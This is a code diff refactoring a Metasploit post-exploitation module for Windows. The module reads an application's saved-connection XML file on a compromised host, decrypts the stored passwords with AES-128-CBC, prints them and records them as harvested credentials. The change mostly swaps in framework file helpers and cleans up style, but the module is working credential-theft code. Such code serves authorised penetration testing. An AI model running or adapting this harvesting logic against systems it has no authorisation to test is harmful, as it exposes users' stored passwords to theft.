@@ -10,9 +10,9 @@ require 'rexml/document'
 require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
+  include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
   include Msf::Auxiliary::Report
-
 
   def initialize(info={})
     super( update_info( info,
@@ -49,19 +49,17 @@ class Metasploit3 < Msf::Post
   end
 
   def get_xml(path)
-    condata=""
+    print_status("Looking for #{path}")
     begin
-      xmlexists = client.fs.file.stat(path)
-      connections = client.fs.file.new(path,'r')
-      until connections.eof
-        condata << connections.read
+      if file_exist?(path)
+        condata = read_file(path)
+        parse_xml(condata)
+        print_status("Finished processing #{path}")
       end
-      parse_xml(condata)
-      print_status("Finished processing #{path}")
     rescue Rex::Post::Meterpreter::RequestError
       print_status("The file #{path} either could not be read or does not exist")
+      return
     end
-
   end
 
   def parse_xml(data)
@@ -75,17 +73,12 @@ class Metasploit3 < Msf::Post
       user = node.attributes['Username']
       domain = node.attributes['Domain']
       epassword= node.attributes['Password']
-      next if epassword == nil or epassword== ""
+      next if epassword == nil || epassword == ""
+
       decoded = epassword.unpack("m*")[0]
-      iv= decoded.slice!(0,16)
-      pass=decrypt(decoded, @secret , iv, "AES-128-CBC")
+      iv = decoded.slice!(0,16)
+      pass = decrypt(decoded, @secret , iv, "AES-128-CBC")
       print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} Domain: #{domain} USER: #{user} PASS: #{pass}")
-      user= "#{domain}\\#{user}" unless domain.nil? or domain.empty?
-      if session.db_record
-        source_id = session.db_record.id
-      else
-        source_id = nil
-      end
 
       service_data = {
         address: host,
@@ -104,7 +97,7 @@ class Metasploit3 < Msf::Post
         username: user
       }
 
-      unless domain.blank?
+      if domain.present?
         credential_data[:realm_key]   = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
         credential_data[:realm_value] = domain
       end
@@ -115,15 +108,14 @@ class Metasploit3 < Msf::Post
       credential_core = create_credential(credential_data)
 
       # Assemble the options hash for creating the Metasploit::Credential::Login object
-      login_data ={
+      login_data = {
           core: credential_core,
           status: Metasploit::Model::Login::Status::UNTRIED
       }
 
       # Merge in the service data and create our Login
       login_data.merge!(service_data)
-      login = create_credential_login(login_data)
-
+      create_credential_login(login_data)
     end
   end
 
